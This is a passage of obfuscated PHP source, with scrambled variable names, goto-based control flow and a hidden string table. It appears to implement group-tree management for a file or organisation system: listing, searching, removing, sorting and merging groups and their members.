Pinyin::encode($BèŸ¾¤Á, $fò×­É¤´ù[566])); $this->metaSet($Dè®¾Ô‹¼â, $D•œçÖÕ…); } protected function groupStatus($f­­šéŸâ…, $AåÏŠÙö„‡) { goto F·›ö¶¡¥; F”¹½ÉùÒ: foreach ($Açíš¿„œš as $f­­šéŸâ…) { $dã‹·×Ç[] = array($eêï´è»Ó¬[1699] => $f­­šéŸâ…, $eêï´è»Ó¬[93] => $eêï´è»Ó¬[726], $eêï´è»Ó¬[381] => $AåÏŠÙö„‡); } return Model($eêï´è»Ó¬[1779])->addAll($dã‹·×Ç, array(), !0); goto b‚‡™«„; F·›ö¶¡¥: $eêï´è»Ó¬ =& $_SERVER[úÉ·öƒÑì©]; $b‘„é±§‘õ = $this->getInfoSimple($f­­šéŸâ…); if (!$b‘„é±§‘õ) { return !1; } goto c¶…·Å¾ Ô; c¶…·Å¾ Ô: if ($AåÏŠÙö„‡ == $eêï´è»Ó¬[87]) { $Açíš¿„œš = $this->parentLevelArray($b‘„é±§‘õ[$eêï´è»Ó¬[496]]); } else { $FÔÉÔ†—¹ = array($eêï´è»Ó¬[562] => array($eêï´è»Ó¬[521], $b‘„é±§‘õ[$eêï´è»Ó¬[496]] . $b‘„é±§‘õ[$eêï´è»Ó¬[1699]] . $eêï´è»Ó¬[522])); $Açíš¿„œš = $this->where($FÔÉÔ†—¹)->field($eêï´è»Ó¬[1699])->select(); $Açíš¿„œš = array_to_keyvalue($Açíš¿„œš, $eêï´è»Ó¬[33], $eêï´è»Ó¬[1699]); } $Açíš¿„œš[] = $b‘„é±§‘õ[$eêï´è»Ó¬[1699]]; $dã‹·×Ç = array(); goto F”¹½ÉùÒ; b‚‡™«„: } protected function groupRemove($d”öÖæ–ÀŠ) { goto Céª•Ÿò¦; fÆè™Ê´Î‰: $this->where(array($BÇÌ÷’ŒÌ[487] => $d”öÖæ–ÀŠ))->save(array($BÇÌ÷’ŒÌ[487] => $fñˆ­í±†è[$BÇÌ÷’ŒÌ[487]])); Model($BÇÌ÷’ŒÌ[1779])->where($D¹Ñé«½—Ó)->delete(); Model($BÇÌ÷’ŒÌ[1780])->where($D¹Ñé«½—Ó)->delete(); goto BğÃŠÛ¶‹Ü; BğÃŠÛ¶‹Ü: Model($BÇÌ÷’ŒÌ[806])->groupRootRemove($d”öÖæ–ÀŠ); return $this->where($D¹Ñé«½—Ó)->delete(); goto EèÔ±«Ä; dóÛ»ôÔ: if (!$fñˆ­í±†è || $fñˆ­í±†è[$BÇÌ÷’ŒÌ[487]] == 0) { return !1; } $aÚÚÎ»§¯ = $this->getInfoSimple($fñˆ­í±†è[$BÇÌ÷’ŒÌ[487]]); $this->_changeChildLevel($fñˆ­í±†è, $aÚÚÎ»§¯, !0); goto fÆè™Ê´Î‰; Céª•Ÿò¦: $BÇÌ÷’ŒÌ =& $_SERVER[úÉ·öƒÑì©]; $D¹Ñé«½—Ó = array($BÇÌ÷’ŒÌ[1699] => $d”öÖæ–ÀŠ); $fñˆ­í±†è = $this->where($D¹Ñé«½—Ó)->find(); goto dóÛ»ôÔ; EèÔ±«Ä: } protected function groupSort($B½ª†¥óÈ) { $AŒ‘˜¯–Òö =& $_SERVER[úÉ·öƒÑì©]; $dµÚ¸ªÉÀ¤ = array(); foreach ($B½ª†¥óÈ as $c¤»ÓÆÕÖ => $D±îñòñÅ) { $dµÚ¸ªÉÀ¤[] = array($AŒ‘˜¯–Òö[1699], $D±îñòñÅ, $AŒ‘˜¯–Òö[1722], $c¤»ÓÆÕÖ + 1); } $this->saveAll($dµÚ¸ªÉÀ¤); } public function listData() { $A»İÉÂÆ‚¿ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($A»İÉÂÆ‚¿[$_SERVER[úÉ·öƒÑì©][376]]); return $A»İÉÂÆ‚¿; } private function _makeOrder($cîâÍ¹Ã•Ÿ = '') { goto CÓ¿¬‡·¾; CÓ¿¬‡·¾: $Bø±£¨æì¦ =& $_SERVER[úÉ·öƒÑì©]; $cËë¼ö§ØÃ = array($Bø±£¨æì¦[1699], $Bø±£¨æì¦[28], $Bø±£¨æì¦[1685], $Bø±£¨æì¦[194]); $a¶²¸¾î¤ = array($Bø±£¨æì¦[437] => $Bø±£¨æì¦[438], $Bø±£¨æì¦[439] => $Bø±£¨æì¦[440]); goto f¢©õ¥É…’; f¢©õ¥É…’: $f–Ù¾´±¤ğ = Input::get($Bø±£¨æì¦[444], $Bø±£¨æì¦[7], $Bø±£¨æì¦[1703], $cËë¼ö§ØÃ); $c²†®Ù¬¨ = Input::get($Bø±£¨æì¦[445], $Bø±£¨æì¦[7], $Bø±£¨æì¦[1781], array($Bø±£¨æì¦[1781], $Bø±£¨æì¦[439])); $c²†®Ù¬¨ = $a¶²¸¾î¤[$c²†®Ù¬¨]; goto A±†ì‚ÏÔÚ; A±†ì‚ÏÔÚ: $cîâÍ¹Ã•Ÿ = $cîâÍ¹Ã•Ÿ . "{$f–Ù¾´±¤ğ}\40{$c²†®Ù¬¨}\x2c\40\147\x72\x6f\x75\160\111\104\40\x61\163\x63"; return $this->order($cîâÍ¹Ã•Ÿ); goto d‘®¸Ñ¹¸¼; d‘®¸Ñ¹¸¼: } public function listChild($B…ÖÍ½•) { $A­øÄâ¥¾ñ =& $_SERVER[úÉ·öƒÑì©]; $C‹µ¢„Ò¬ = $this->where(array($A­øÄâ¥¾ñ[487] => $B…ÖÍ½•))->_makeOrder()->selectPage(200); $this->_listDataApply($C‹µ¢„Ò¬[$A­øÄâ¥¾ñ[376]]); return $C‹µ¢„Ò¬; } public function listByID($F—Ô˜ó…ä) { $a¯¿£‡áÁÒ =& $_SERVER[úÉ·öƒÑì©]; if (!$F—Ô˜ó…ä) { return array(); } $d±ìíáğ‰ã = array($a¯¿£‡áÁÒ[1699] => array($a¯¿£‡áÁÒ[7], $F—Ô˜ó…ä)); $aÄ¸‚¸’ÍŞ = $this->where($d±ìíáğ‰ã)->select(); $this->_listDataApply($aÄ¸‚¸’ÍŞ); return $aÄ¸‚¸’ÍŞ; } public function listSearch($A„ô‘Ãä¨¸) { goto dÅ–ù‚ù¸; eÆ—Ú‡Š: if ($d³ä‡Œ÷šå) { $cèÏ’Óë¡ = $this->getInfoSimple($d³ä‡Œ÷šå); $Eñ‹‰î–¥Õ = $cèÏ’Óë¡[$CÄ¥ê²©†æ[496]] . $d³ä‡Œ÷šå . $CÄ¥ê²©†æ[522]; $cÔ÷·ÀÜ = array($cÔ÷·ÀÜ, array($CÄ¥ê²©†æ[496] => array($CÄ¥ê²©†æ[389], $Eñ‹‰î–¥Õ))); } $cÔ÷·ÀÜ = $this->parseWhereLike($cÔ÷·ÀÜ); $f«Ñ’ÇÅÛ® = $this->_makeOrder()->where($cÔ÷·ÀÜ)->selectPage(20); goto cˆ–«ŠµÛ; D­Š½’ğõ: if (!trim($e”çù)) { return !1; } $e”çù = str_replace($CÄ¥ê²©†æ[1784], $CÄ¥ê²©†æ[1785], $e”çù); $cÔ÷·ÀÜ = array($CÄ¥ê²©†æ[1699] => array($CÄ¥ê²©†æ[389], "{$e”çù}\45"), $CÄ¥ê²©†æ[28] => array($CÄ¥ê²©†æ[389], "\45{$e”çù}\45"), $CÄ¥ê²©†æ[965] => $CÄ¥ê²©†æ[1786]); goto eÆ—Ú‡Š; E¾¡Ö¿òœ«: return $f«Ñ’ÇÅÛ®; goto Bæ˜„Òí°‚; cˆ–«ŠµÛ: $f«Ñ’ÇÅÛ® = $f«Ñ’ÇÅÛ® ? $f«Ñ’ÇÅÛ® : array($CÄ¥ê²©†æ[376] => array(), $CÄ¥ê²©†æ[373] => array()); if (!$f«Ñ’ÇÅÛ® || count($f«Ñ’ÇÅÛ®[$CÄ¥ê²©†æ[376]]) < 5 && Input::check($e”çù, $CÄ¥ê²©†æ[325])) { goto f—Èçššè¹; A”è¹Ñƒ‰²: $BˆÇŞ¥Ü = array_merge($D¹¸ï·ì±í, $a”ùİÊØÊ½, $f«Ñ’ÇÅÛ®[$CÄ¥ê²©†æ[376]]); $f«Ñ’ÇÅÛ®[$CÄ¥ê²©†æ[376]] = array_unique_by_key($BˆÇŞ¥Ü, $CÄ¥ê²©†æ[1699]); $f«Ñ’ÇÅÛ®[$CÄ¥ê²©†æ[373]][$CÄ¥ê²©†æ[374]] = count($f«Ñ’ÇÅÛ®[$CÄ¥ê²©†æ[376]]); goto Fë÷†ğ‡×Ÿ; f—Èçššè¹: $cšçÎÌÖœ = $this->groupChildrenAll($d³ä‡Œ÷šå); $D¹¸ï·ì±í = $this->_searchFromMeta($CÄ¥ê²©†æ[452], $e”çù, 10, $cšçÎÌÖœ); $a”ùİÊØÊ½ = $this->_searchFromMeta($CÄ¥ê²©†æ[453], $e”çù, 10, $cšçÎÌÖœ); goto A”è¹Ñƒ‰²; Fë÷†ğ‡×Ÿ: $f«Ñ’ÇÅÛ®[$CÄ¥ê²©†æ[373]][$CÄ¥ê²©†æ[375]] = ceil($f«Ñ’ÇÅÛ®[$CÄ¥ê²©†æ[373]][$CÄ¥ê²©†æ[374]] / $f«Ñ’ÇÅÛ®[$CÄ¥ê²©†æ[373]][$CÄ¥ê²©†æ[370]]); goto Ašºìéù´¤; Ašºìéù´¤: } $this->_listDataApply($f«Ñ’ÇÅÛ®[$CÄ¥ê²©†æ[376]]); goto E¾¡Ö¿òœ«; dÅ–ù‚ù¸: $CÄ¥ê²©†æ =& $_SERVER[úÉ·öƒÑì©]; $e”çù = $A„ô‘Ãä¨¸[$CÄ¥ê²©†æ[1782]]; $d³ä‡Œ÷šå = isset($A„ô‘Ãä¨¸[$CÄ¥ê²©†æ[1783]]) ? $A„ô‘Ãä¨¸[$CÄ¥ê²©†æ[1783]] : !1; goto D­Š½’ğõ; Bæ˜„Òí°‚: } protected function groupChildrenAll($AÊ‹Ğ«¾) { $B”Éª©ÑµÑ =& $_SERVER[úÉ·öƒÑì©]; if (!$AÊ‹Ğ«¾) { return !1; } if (is_string($AÊ‹Ğ«¾)) { $AÊ‹Ğ«¾ = array($AÊ‹Ğ«¾); } $eêŠÚã´ = $AÊ‹Ğ«¾; foreach ($AÊ‹Ğ«¾ as $F¯âè…²ò£) { $A¿¸¹£Ïò¡ = $this->getInfoSimple($F¯âè…²ò£); $Cà‘‚îòÆš = array($B”Éª©ÑµÑ[496] => array($B”Éª©ÑµÑ[389], $A¿¸¹£Ïò¡[$B”Éª©ÑµÑ[496]] . $F¯âè…²ò£ . $B”Éª©ÑµÑ[522])); $FØêîîœË‹ = $this->field($B”Éª©ÑµÑ[1699])->where($Cà‘‚îòÆš)->select(); $eêŠÚã´ = array_merge($eêŠÚã´, array_to_keyvalue($FØêîîœË‹, $B”Éª©ÑµÑ[33], $B”Éª©ÑµÑ[1699])); } return array_unique($eêŠÚã´); } private function _searchFromMeta($Cê²òŸùÃÈ, $FïÕŠ’†„’, $d ˜°Äë°, $f´ğ‰é“‡Ê) { goto dÏÈ×Ôâ”õ; dÏÈ×Ôâ”õ: $eµ”Ó‘ÈñÇ =& $_SERVER[úÉ·öƒÑì©]; $FïÕŠ’†„’ = strtolower($FïÕŠ’†„’); $CªŠµ öí = array($eµ”Ó‘ÈñÇ[93] => $Cê²òŸùÃÈ, $eµ”Ó‘ÈñÇ[381] => array($eµ”Ó‘ÈñÇ[389], "\45{$FïÕŠ’†„’}\x25")); goto c¹Ê©·ŒÄ; D§‡å¼Ê‹: if (!$a«óÜ‰) { return array(); } $a«óÜ‰ = array_to_keyvalue($a«óÜ‰, $eµ”Ó‘ÈñÇ[33], $eµ”Ó‘ÈñÇ[1699]); $Bù‡ÛõŠŒ = $this->where(array($eµ”Ó‘ÈñÇ[1777] => array($eµ”Ó‘ÈñÇ[7], $a«óÜ‰)))->select(); goto f½Ò£‰Â†‚; c¹Ê©·ŒÄ: $CªŠµ öí = $this->parseWhereLike($CªŠµ öí); if ($f´ğ‰é“‡Ê) { $CªŠµ öí[$eµ”Ó‘ÈñÇ[1699]] = array($eµ”Ó‘ÈñÇ[7], $f´ğ‰é“‡Ê); } $a«óÜ‰ = Model($eµ”Ó‘ÈñÇ[1787])->where($CªŠµ öí)->limit($d ˜°Äë°)->select(); goto D§‡å¼Ê‹; f½Ò£‰Â†‚: if (!$Bù‡ÛõŠŒ) { return array(); } return $Bù‡ÛõŠŒ; goto BÅÎÔºÎ»; BÅÎÔºÎ»: } protected function _listDataApplyItem($C¨ÁºŒó—¾) { $fºÌ‡Ì‘Óê = array($C¨ÁºŒó—¾); $this->_listDataApply($fºÌ‡Ì‘Óê); return $fºÌ‡Ì‘Óê[0]; } protected function _listDataApply(&$D¹Ğã­ã¾—) { goto c‰“ˆ”¬ù; c‰“ˆ”¬ù: $EÒŒ­íÑ½† =& $_SERVER[úÉ·öƒÑì©]; if (!$D¹Ğã­ã¾—) { return; } $D››­Ò¶Ë = array_to_keyvalue($D¹Ğã­ã¾—, $EÒŒ­íÑ½†[33], $EÒŒ­íÑ½†[1699]); goto d¶¯Äß¦®²; b¼¸õ¦ á: $this->_listAppendParent($D¹Ğã­ã¾—); $this->_listAppendSourceRoot($D¹Ğã­ã¾—, $D››­Ò¶Ë); goto eìËö„Ñ´‘; d¶¯Äß¦®²: $this->_listAppendChildren($D¹Ğã­ã¾—); $this->_listAppendChildrenMember($D¹Ğã­ã¾—); $this->_listAppendMeta($D¹Ğã­ã¾—, $D››­Ò¶Ë); goto b¼¸õ¦ á; eìËö„Ñ´‘: } private function _listAppendChildren(&$dÕÔ•–„ìï) { goto aİàÂ‚‚‹¨; e±æ‘›ÀÆñ: foreach ($dÕÔ•–„ìï as &$aË‚·˜•­) { $CÒå§‰è½Ï = $aË‚·˜•­[$a…Ö½‚›¤æ[1699]]; $aË‚·˜•­[$a…Ö½‚›¤æ[1789]] = isset($fæğ´½‰¥ò[$CÒå§‰è½Ï]) ? intval($fæğ´½‰¥ò[$CÒå§‰è½Ï]) : !1; } unset($aË‚·˜•­); goto Cñ›­ÅåŒ‰; aİàÂ‚‚‹¨: $a…Ö½‚›¤æ =& $_SERVER[úÉ·öƒÑì©]; $dÙó¬øèõ˜ = array_to_keyvalue($dÕÔ•–„ìï, $a…Ö½‚›¤æ[33], $a…Ö½‚›¤æ[1699]); $bÄ÷ÕŠÙ‚ = array($a…Ö½‚›¤æ[487] => array($a…Ö½‚›¤æ[7], $dÙó¬øèõ˜)); goto AÜ¿Íé‡ù×; AÜ¿Íé‡ù×: $cŒ±•£ªîŠ = array($a…Ö½‚›¤æ[487], $a…Ö½‚›¤æ[1788] => $a…Ö½‚›¤æ[489]); $Bê©÷°˜‡é = $this->field($cŒ±•£ªîŠ)->where($bÄ÷ÕŠÙ‚)->group($a…Ö½‚›¤æ[487])->select(); $fæğ´½‰¥ò = array_to_keyvalue($Bê©÷°˜‡é, $a…Ö½‚›¤æ[487], $a…Ö½‚›¤æ[489]); goto e±æ‘›ÀÆñ; Cñ›­ÅåŒ‰: } private function _listAppendChildrenMember(&$E§èÚçØë) { goto bÇ‘¿îğ¾İ; báŠÂ—¦“¥: $dĞÖØ¿Êïë = array($a™ö÷Âß­Ñ[1699], $a™ö÷Âß­Ñ[1788] => $a™ö÷Âß­Ñ[489]); $fò“ÌØğ”¦ = Model($a™ö÷Âß­Ñ[1780])->field($dĞÖØ¿Êïë)->where($A…ÁÀ«‘ø˜)->group($a™ö÷Âß­Ñ[1699])->select(); $EÀõ»§Î» = array_to_keyvalue($fò“ÌØğ”¦, $a™ö÷Âß­Ñ[1699], $a™ö÷Âß­Ñ[489]); goto E…†ê‚ìÓ™; bÇ‘¿îğ¾İ: $a™ö÷Âß­Ñ =& $_SERVER[úÉ·öƒÑì©]; $dö™¡èˆ¯î = array_to_keyvalue($E§èÚçØë, $a™ö÷Âß­Ñ[33], $a™ö÷Âß­Ñ[1699]); $A…ÁÀ«‘ø˜ = array($a™ö÷Âß­Ñ[1699] => array($a™ö÷Âß­Ñ[7], $dö™¡èˆ¯î)); goto báŠÂ—¦“¥; E…†ê‚ìÓ™: foreach ($E§èÚçØë as &$DôÃß¡Ç‘¼) { $aÅÒæ¥ˆÆ› = $DôÃß¡Ç‘¼[$a™ö÷Âß­Ñ[1699]]; $DôÃß¡Ç‘¼[$a™ö÷Âß­Ñ[1790]] = isset($EÀõ»§Î»[$aÅÒæ¥ˆÆ›]) ? intval($EÀõ»§Î»[$aÅÒæ¥ˆÆ›]) : !1; } unset($DôÃß¡Ç‘¼); goto dƒÁ½ƒÂ‹×; dƒÁ½ƒÂ‹×: } private function _listAppendMeta(&$Fá˜¦ğ´…Ø, $D¾ë½Œæò) { goto E½ÖĞƒˆ®œ; DêÙ®îëÁ: foreach ($Fá˜¦ğ´…Ø as &$bœ·‚¡ğ½÷) { $bœ·‚¡ğ½÷[$AäŠãäÔ¾‘[454]] = array(); if (isset($D¤ÊŠô¤ˆï[$bœ·‚¡ğ½÷[$AäŠãäÔ¾‘[1699]]])) { $bœ·‚¡ğ½÷[$AäŠãäÔ¾‘[454]] = $D¤ÊŠô¤ˆï[$bœ·‚¡ğ½÷[$AäŠãäÔ¾‘[1699]]]; } } unset($bœ·‚¡ğ½÷); goto føªæøëÆ; A‹ƒ¤©”ğš: $D¤ÊŠô¤ˆï = array_to_keyvalue_group($D¤ÊŠô¤ˆï, $AäŠãäÔ¾‘[1699]); foreach ($D¤ÊŠô¤ˆï as &$a¢ª·¸œİƒ) { $a¢ª·¸œİƒ = array_to_keyvalue($a¢ª·¸œİƒ, $AäŠãäÔ¾‘[93], $AäŠãäÔ¾‘[381]); } unset($a¢ª·¸œİƒ); goto DêÙ®îëÁ; E½ÖĞƒˆ®œ: $AäŠãäÔ¾‘ =& $_SERVER[úÉ·öƒÑì©]; $A•ôÅß¨âØ = array($AäŠãäÔ¾‘[1699] => array($AäŠãäÔ¾‘[7], $D¾ë½Œæò)); $D¤ÊŠô¤ˆï = Model($AäŠãäÔ¾‘[1779])->where($A•ôÅß¨âØ)->select(); goto A‹ƒ¤©”ğš; føªæøëÆ: } protected function parentLevelArray($A½Ş„áÚĞ) { $AÓ˜òæ±ô© =& $_SERVER[úÉ·öƒÑì©]; $A½Ş„áÚĞ = explode($AÓ˜òæ±ô©[47], trim($A½Ş„áÚĞ, $AÓ˜òæ±ô©[47])); $A½Ş„áÚĞ = array_remove_value($A½Ş„áÚĞ, $AÓ˜òæ±ô©[191]); return $A½Ş„áÚĞ; } private function _listAppendParent(&$f©É·¦–¾‚) { goto Cù»Í÷ò; CßŒÅƒ Êº: if ($GLOBALS[$còÖßáÅÚï[494]] == $còÖßáÅÚï[87]) { $AÍ±Ûß¨ï¯ = !1; } foreach ($f©É·¦–¾‚ as &$F©æŸŸ‚Á¿) { $Dù¢‡ÖÑ = $this->parentLevelArray($F©æŸŸ‚Á¿[$còÖßáÅÚï[496]]); $aÀ¯íôÅ¹ = $còÖßáÅÚï[33]; foreach ($Dù¢‡ÖÑ as $B“¸ƒ´¤â => $C ÓáœÌ¼Ú) { if ($AÍ±Ûß¨ï¯ && $B“¸ƒ´¤â == 0) { continue; } $aÀ¯íôÅ¹ .= $f££ì•–º[$C ÓáœÌ¼Ú] . $còÖßáÅÚï[8]; } if ($Dù¢‡ÖÑ) { $aÀ¯íôÅ¹ .= $F©æŸŸ‚Á¿[$còÖßáÅÚï[28]]; } $F©æŸŸ‚Á¿[$còÖßáÅÚï[500]] = str_replace($còÖßáÅÚï[505], $còÖßáÅÚï[8], $aÀ¯íôÅ¹); } unset($F©æŸŸ‚Á¿); goto D¾ƒÊªª³; Cù»Í÷ò: $còÖßáÅÚï =& $_SERVER[úÉ·öƒÑì©]; $f££ì•–º = array(); foreach ($f©É·¦–¾‚ as &$F©æŸŸ‚Á¿) { $f££ì•–º[$F©æŸŸ‚Á¿[$còÖßáÅÚï[1699]]] = $F©æŸŸ‚Á¿[$còÖßáÅÚï[28]]; $Dù¢‡ÖÑ = $this->parentLevelArray($F©æŸŸ‚Á¿[$còÖßáÅÚï[496]]); foreach ($Dù¢‡ÖÑ as $C ÓáœÌ¼Ú) { if (!isset($f££ì•–º[$C ÓáœÌ¼Ú])) { $f££ì•–º[$C ÓáœÌ¼Ú] = 0; } } } goto Cœì‚ÓØÍ†; Cœì‚ÓØÍ†: unset($F©æŸŸ‚Á¿); foreach ($f££ì•–º as $B“¸ƒ´¤â => $fù¡áÈÙ¸Ø) { if ($fù¡áÈÙ¸Ø) { continue; } $D†å‰Ø•Ä = $this->getInfoSimple($B“¸ƒ´¤â); $f££ì•–º[$B“¸ƒ´¤â] = $D†å‰Ø•Ä[$còÖßáÅÚï[28]]; } $AÍ±Ûß¨ï¯ = $GLOBALS[$còÖßáÅÚï[6]][$còÖßáÅÚï[88]][$còÖßáÅÚï[1791]]; goto CßŒÅƒ Êº; D¾ƒÊªª³: } private function _listAppendSourceRoot(&$B§¢Œæ˜°, $b®Å‚¾ïğ) { goto AŒĞÈÜ¤ÅÓ; b„„½µ—µë: $Eøé‚¡ë“Ç = Model($EêÎ‘Ö¦ì[806])->order($EêÎ‘Ö¦ì[1793])->field($B²ä—“­ŒØ)->where($bŞ¸õ‘øïÄ)->select(); $Eøé‚¡ë“Ç = array_to_keyvalue($Eøé‚¡ë“Ç, $EêÎ‘Ö¦ì[493]); $Eøé‚¡ë“Ç = array_remove_key($Eøé‚¡ë“Ç, $EêÎ‘Ö¦ì[493]); goto d«Ÿ‘ÆÜø; d«Ÿ‘ÆÜø: foreach ($B§¢Œæ˜° as &$cĞõª»–œø) { $cĞõª»–œø[$EêÎ‘Ö¦ì[85]] = $Eøé‚¡ë“Ç[$cĞõª»–œø[$EêÎ‘Ö¦ì[1699]]] ? $Eøé‚¡ë“Ç[$cĞõª»–œø[$EêÎ‘Ö¦ì[1699]]] : array(); } unset($cĞõª»–œø); goto AĞ‰®÷‰Š†; AŒĞÈÜ¤ÅÓ: $EêÎ‘Ö¦ì =& $_SERVER[úÉ·öƒÑì©]; $bŞ¸õ‘øïÄ = array($EêÎ‘Ö¦ì[413] => SourceModel::TYPE_GROUP, $EêÎ‘Ö¦ì[487] => 0, $EêÎ‘Ö¦ì[493] => array($EêÎ‘Ö¦ì[7], $b®Å‚¾ïğ)); $B²ä—“­ŒØ = $EêÎ‘Ö¦ì[1792]; goto b„„½µ—µë; AĞ‰®÷‰Š†: } protected function groupMerge($a¹­¨ë¸Ø) { $a¹­¨ë¸Ø = array_values(array_unique($a¹­¨ë¸Ø)); $c±ÖšÑÊ = array(); for ($Dà«ªŒÏ â = 0; $Dà«ªŒÏ â < count($a¹­¨ë¸Ø); $Dà«ªŒÏ â++) { $C¨¯¿¦¸í = !1; for ($A£Ò¾¸§ = 0; $A£Ò¾¸§ < count($a¹­¨ë¸Ø); $A£Ò¾¸§++) { if ($Dà«ªŒÏ â == $A£Ò¾¸§) { continue; } if ($this->isParentOf($a¹­¨ë¸Ø[$A£Ò¾¸§], $a¹­¨ë¸Ø[$Dà«ªŒÏ â])) { $C¨¯¿¦¸í = !0; break; } } if (!$C¨¯¿¦¸í) { $c±ÖšÑÊ[] = $a¹­¨ë¸Ø[$Dà«ªŒÏ â]; } } return $c±ÖšÑÊ; } protected function isParentOf($C„ŸãŒÊª, $A¸­¤Æ¡Şî) { goto dĞÎ°Üòæ»; dĞÎ°Üòæ»: $E£œí‹ƒÇ¦ =& $_SERVER[úÉ·öƒÑì©]; if (!$C„ŸãŒÊª || !$A¸­¤Æ¡Şî || $C„ŸãŒÊª == $A¸­¤Æ¡Şî) { return !1; } $C­éğìÖŠ = $this->getInfoSimple($C„ŸãŒÊª); goto a•Éó¶ÍÊ×; a•Éó¶ÍÊ×: $E¿¯º¡…áÍ = $this->getInfoSimple($A¸­¤Æ¡Şî); $fÃ£™µ•ö¡ = $C­éğìÖŠ[$E£œí‹ƒÇ¦[496]] . $C„ŸãŒÊª . $E£œí‹ƒÇ¦[47]; if (substr($E¿¯º¡…áÍ[$E£œí‹ƒÇ¦[496]], 0, strlen($fÃ£™µ•ö¡)) == $fÃ£™µ•ö¡) { return !0; } goto aÙê’³Ò…Š; aÙê’³Ò…Š: return !1; goto f™àÔê£²»; f™àÔê£²»: } public function groupShowRoot($BÀ‰˜ßä¡‡, $Eêİœ†¥Éˆ = false) { goto fÓ–Âçõ‰À; aô†÷¬¶¼×: $bòêòà®À¯ = $this->parentLevelArray($c…õ˜é åŒ[$fãÚƒ‘»”œ[496]]); $EÏÉØ¦Âä‚ = array($BÀ‰˜ßä¡‡); if (count($bòêòà®À¯) == 0) { return $EÏÉØ¦Âä‚; } goto c°˜æ–¢Õ; c°˜æ–¢Õ: if ($Eêİœ†¥Éˆ && count($bòêòà®À¯) == 1) { return $EÏÉØ¦Âä‚; } if (!$c…õ˜é åŒ[$fãÚƒ‘»”œ[454]] || !isset($c…õ˜é åŒ[$fãÚƒ‘»”œ[454]][$fãÚƒ‘»”œ[1775]]) || $c…õ˜é åŒ[$fãÚƒ‘»”œ[454]][$fãÚƒ‘»”œ[1775]] == $fãÚƒ‘»”œ[1749]) { return $this->groupShowRoot($bòêòà®À¯[count($bòêòà®À¯) - 1], $Eêİœ†¥Éˆ); } if ($c…õ˜é åŒ[$fãÚƒ‘»”œ[454]][$fãÚƒ‘»”œ[1775]] == $fãÚƒ‘»”œ[366]) { $F„ëğŸœÀÜ = explode($fãÚƒ‘»”œ[47], $c…õ˜é åŒ[$fãÚƒ‘»”œ[454]][$fãÚƒ‘»”œ[1776]]); if ($F„ëğŸœÀÜ) { $EÏÉØ¦Âä‚ = array_merge($EÏÉØ¦Âä‚, $F„ëğŸœÀÜ); } } goto Fåˆ…Í÷ñİ; fÓ–Âçõ‰À: $fãÚƒ‘»”œ =& $_SERVER[úÉ·öƒÑì©]; $c…õ˜é åŒ = $this->getInfo($BÀ‰˜ßä¡‡); if (!$c…õ˜é åŒ) { return array(); } goto aô†÷¬¶¼×; Fåˆ…Í÷ñİ: return $EÏÉØ¦Âä‚; goto Bæ£Æò¸š; Bæ£Æò¸š: } protected function resetParentLevel() { $e¾ëŠÕÖ Ç =& $_SERVER[úÉ·öƒÑì©]; $eÃ¦Ğ²Âå = $e¾ëŠÕÖ Ç[1699]; $báˆù¥ŞÕ = $this->select(); $báˆù¥ŞÕ = array_to_keyvalue($báˆù¥ŞÕ, $eÃ¦Ğ²Âå); foreach ($báˆù¥ŞÕ as $eº™…‡èäŠ) { goto eåÃßØ ®×; cø–”¢º‹: $EÁÆ©ã‡­ [] = 0; $EÁÆ©ã‡­  = $e¾ëŠÕÖ Ç[47] . implode($e¾ëŠÕÖ Ç[47], array_reverse($EÁÆ©ã‡­ )) . $e¾ëŠÕÖ Ç[47]; $this->setNamePinyin($eº™…‡èäŠ[$eÃ¦Ğ²Âå], $eº™…‡èäŠ[$e¾ëŠÕÖ Ç[28]]); goto f’ªøË¯Í¤; eåÃßØ ®×: $f©õ´Œ¸‹ï = $eº™…‡èäŠ; $EÁÆ©ã‡­  = array(); while ($f©õ´Œ¸‹ï[$e¾ëŠÕÖ Ç[487]] != 0) { $EÁÆ©ã‡­ [] = $f©õ´Œ¸‹ï[$e¾ëŠÕÖ Ç[487]]; $f©õ´Œ¸‹ï = $báˆù¥ŞÕ[$f©õ´Œ¸‹ï[$e¾ëŠÕÖ Ç[487]]]; } goto cø–”¢º‹; f’ªøË¯Í¤: $this->where(array($eÃ¦Ğ²Âå => $eº™…‡èäŠ[$eÃ¦Ğ²Âå]))->save(array($e¾ëŠÕÖ Ç[562] => $EÁÆ©ã‡­ )); goto câåè»‹Â§; câåè»‹Â§: } return $báˆù¥ŞÕ; } public function groupNameAuto($D×¡ï¤Şç—, $D“Ôö™) { $bÛ¬˜ŸÅä =& $_SERVER[úÉ·öƒÑì©]; $cšÀ¸¹øÂ² = $this->where(array($bÛ¬˜ŸÅä[403] => $D×¡ï¤Şç—))->getField($bÛ¬˜ŸÅä[28], !0); if (!$cšÀ¸¹øÂ² || !in_array($D“Ôö™, $cšÀ¸¹øÂ²)) { return $D“Ôö™; } for ($d¾¯ĞçöÊ = 1; $d¾¯ĞçöÊ <= count($cšÀ¸¹øÂ²) + 1; $d¾¯ĞçöÊ++) { $E¥³£çåˆª = $D“Ôö™ . "\50{$d¾¯ĞçöÊ}\51"; if (!in_array($E¥³£çåˆª, $cšÀ¸¹øÂ²)) { return $E¥³£çåˆª; } } } public function groupSwitch($FÜ¬’ŸÊ‰, $dİ“ĞĞÙ‘) { goto EîâÔêàœ; CßÍ­ °¥Ÿ: $this->where(array($Fµƒéò“¬Å[487] => $FÜ¬’ŸÊ‰))->save(array($Fµƒéò“¬Å[487] => $dİ“ĞĞÙ‘)); return !0; goto d¬–¡¿š÷õ; b²™‚®ùÃÑ: $eƒ¥ÓÛçŒ = array_to_keyvalue($eƒ¥ÓÛçŒ, $Fµƒéò“¬Å[1699]); if (!isset($eƒ¥ÓÛçŒ[$FÜ¬’ŸÊ‰]) || !isset($eƒ¥ÓÛçŒ[$dİ“ĞĞÙ‘]) || $eƒ¥ÓÛçŒ[$FÜ¬’ŸÊ‰][$Fµƒéò“¬Å[487]] == 0) { return !1; } $b¢—ç““ÒÙ = array($Fµƒéò“¬Å[1699] => $FÜ¬’ŸÊ‰); goto fòÎ˜ÌÇ¼±; fÊÊ†»Ğå: $b¢—ç““ÒÙ = array($Fµƒéò“¬Å[413] => 2, $Fµƒéò“¬Å[487] => 0, $Fµƒéò“¬Å[412] => 1, $Fµƒéò“¬Å[493] => array($Fµƒéò“¬Å[7], array($FÜ¬’ŸÊ‰, $dİ“ĞĞÙ‘))); $E¥öÁ’ëÍŠ = Model($Fµƒéò“¬Å[806])->where($b¢—ç““ÒÙ)->field($Fµƒéò“¬Å[1795])->select(); $E¥öÁ’ëÍŠ = 